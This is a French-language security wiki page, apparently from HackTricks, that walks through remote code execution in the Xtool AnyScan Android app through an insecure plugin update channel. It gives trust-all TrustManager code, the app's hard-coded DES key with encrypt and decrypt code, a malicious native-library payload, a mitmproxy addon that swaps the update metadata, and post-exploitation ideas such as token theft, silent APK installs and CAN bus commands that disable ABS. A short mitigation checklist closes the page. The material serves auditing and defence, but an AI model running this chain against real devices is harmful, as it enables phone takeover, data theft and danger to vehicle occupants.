# Mécanismes de mise à jour insecures dans l'application – Exécution de code à distance via des plugins malveillants

{{#include ../../banners/hacktricks-training.md}}

De nombreuses applications Android mettent en œuvre leurs **propres canaux de mise à jour “plugin” ou “fonctionnalité dynamique”** au lieu d'utiliser le Google Play Store. Lorsque l'implémentation est insecure, un attaquant capable d'intercepter le trafic peut fournir **du code natif arbitraire qui sera chargé dans le processus de l'application**, entraînant une Exécution de Code à Distance (RCE) complète sur le téléphone – et dans certains cas sur tout appareil externe contrôlé par l'application (voitures, IoT, dispositifs médicaux…).

Cette page résume une chaîne de vulnérabilité du monde réel trouvée dans l'application de diagnostic automobile Xtool **AnyScan** (v4.40.11 → 4.40.40) et généralise la technique afin que vous puissiez auditer d'autres applications Android et exploiter la mauvaise configuration lors d'un engagement de red team.

---
## 1. Identifier un TrustManager TLS insecure

1. Décompilez l'APK avec jadx / apktool et localisez la pile réseau (OkHttp, HttpUrlConnection, Retrofit…).
2. Recherchez un **`TrustManager`** ou `HostnameVerifier` personnalisé qui fait confiance aveuglément à chaque certificat :
```java
public static TrustManager[] buildTrustManagers() {
return new TrustManager[]{
new X509TrustManager() {
public void checkClientTrusted(X509Certificate[] chain, String authType) {}
public void checkServerTrusted(X509Certificate[] chain, String authType) {}
public X509Certificate[] getAcceptedIssuers() {return new X509Certificate[]{};}
}
};
}
```
3. S'il est présent, l'application acceptera **n'importe quel certificat TLS** → vous pouvez exécuter un **proxy MITM** transparent avec un certificat auto-signé :
```bash
mitmproxy -p 8080 -s addon.py  # see §4
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 8080  # on rooted device / emulator
```
## 2. Ingénierie Inverse des Métadonnées de Mise à Jour

Dans le cas d'AnyScan, chaque lancement d'application déclenche un HTTPS GET à :
```
https://apigw.xtoolconnect.com/uhdsvc/UpgradeService.asmx/GetUpdateListEx
```
Le corps de la réponse est un **document XML** dont les nœuds `<FileData>` contiennent des JSON **encodés en Base64 et chiffrés en DES-ECB** décrivant chaque plugin disponible.

Étapes typiques de recherche :
1. Localiser la routine crypto (par exemple, `RemoteServiceProxy`) et récupérer :
* algorithme (DES / AES / RC4 …)
* mode de fonctionnement (ECB / CBC / GCM …)
* clé / IV codés en dur (souvent des clés DES de 56 bits ou des clés AES de 128 bits dans des constantes)
2. Réimplémenter la fonction en Python pour déchiffrer / chiffrer les métadonnées :
```python
from Crypto.Cipher import DES
from base64 import b64decode, b64encode

KEY = IV = b"\x2A\x10\x2A\x10\x2A\x10\x2A"  # 56-bit key observed in AnyScan

def decrypt_metadata(data_b64: str) -> bytes:
cipher = DES.new(KEY, DES.MODE_ECB)
return cipher.decrypt(b64decode(data_b64))

def encrypt_metadata(plaintext: bytes) -> str:
cipher = DES.new(KEY, DES.MODE_ECB)
return b64encode(cipher.encrypt(plaintext.ljust((len(plaintext)+7)//8*8, b"\x00"))).decode()
```
## 3. Créer un plugin malveillant

1. Choisissez n'importe quel plugin légitime en ZIP et remplacez la bibliothèque native par votre payload :
```c
// libscan_x64.so – constructor runs as soon as the library is loaded
__attribute__((constructor))
void init(void){
__android_log_print(ANDROID_LOG_INFO, "PWNED", "Exploit loaded! uid=%d", getuid());
// spawn reverse shell, drop file, etc.
}
```

```bash
$ aarch64-linux-android-gcc -shared -fPIC payload.c -o libscan_x64.so
$ zip -r PWNED.zip libscan_x64.so assets/ meta.txt
```
2. Mettez à jour les métadonnées JSON afin que `"FileName" : "PWNED.zip"` et que `"DownloadURL"` pointe vers votre serveur HTTP.  
3. Chiffrez en DES + encodez en Base64 le JSON modifié et copiez-le à l'intérieur de l'XML intercepté.

## 4. Livrer le Payload avec mitmproxy

`addon.py` exemple qui *silencieusement* échange les métadonnées originales :
```python
from mitmproxy import http
MOD_XML = open("fake_metadata.xml", "rb").read()

def request(flow: http.HTTPFlow):
if b"/UpgradeService.asmx/GetUpdateListEx" in flow.request.path:
flow.response = http.Response.make(
200,
MOD_XML,
{"Content-Type": "text/xml"}
)
```
Exécutez un serveur web simple pour héberger le ZIP malveillant :
```bash
python3 -m http.server 8000 --directory ./payloads
```
Lorsque la victime lance l'application, elle va :
* récupérer notre XML falsifié via le canal MITM ;
* le déchiffrer et l'analyser avec la clé DES codée en dur ;
* télécharger `PWNED.zip` → dézipper dans le stockage privé ;
* `dlopen()` la *libscan_x64.so* incluse, exécutant instantanément notre code **avec les permissions de l'application** (caméra, GPS, Bluetooth, système de fichiers, …).

Parce que le plugin est mis en cache sur le disque, la porte dérobée **persiste à travers les redémarrages** et s'exécute chaque fois que l'utilisateur sélectionne la fonctionnalité associée.

## 5. Idées de Post-Exploitation

* Voler des cookies de session, des jetons OAuth ou des JWT stockés par l'application.
* Déposer un APK de deuxième étape et l'installer silencieusement via `pm install` (l'application a déjà `REQUEST_INSTALL_PACKAGES`).
* Abuser de tout matériel connecté – dans le scénario AnyScan, vous pouvez envoyer des **commandes OBD-II / CAN bus** arbitraires (déverrouiller les portes, désactiver l'ABS, etc.).

---
### Liste de Vérification pour la Détection & la Mitigation (équipe bleue)

* NE JAMAIS expédier une version de production avec un TrustManager/HostnameVerifier personnalisé qui désactive la validation des certificats.
* Ne pas télécharger de code exécutable depuis l'extérieur de Google Play. Si vous *devez*, signez chaque plugin avec la même clé **apkSigning v2** et vérifiez la signature avant de charger.
* Remplacer le cryptage faible/codé en dur par **AES-GCM** et une clé tournante côté serveur.
* Valider l'intégrité des archives téléchargées (signature ou au moins SHA-256).

---
## Références

- [NowSecure – Remote Code Execution Discovered in Xtool AnyScan App](https://www.nowsecure.com/blog/2025/07/16/remote-code-execution-discovered-in-xtool-anyscan-app-risks-to-phones-and-vehicles/)
- [Android – Unsafe TrustManager patterns](https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager)

{{#include ../../banners/hacktricks-training.md}}
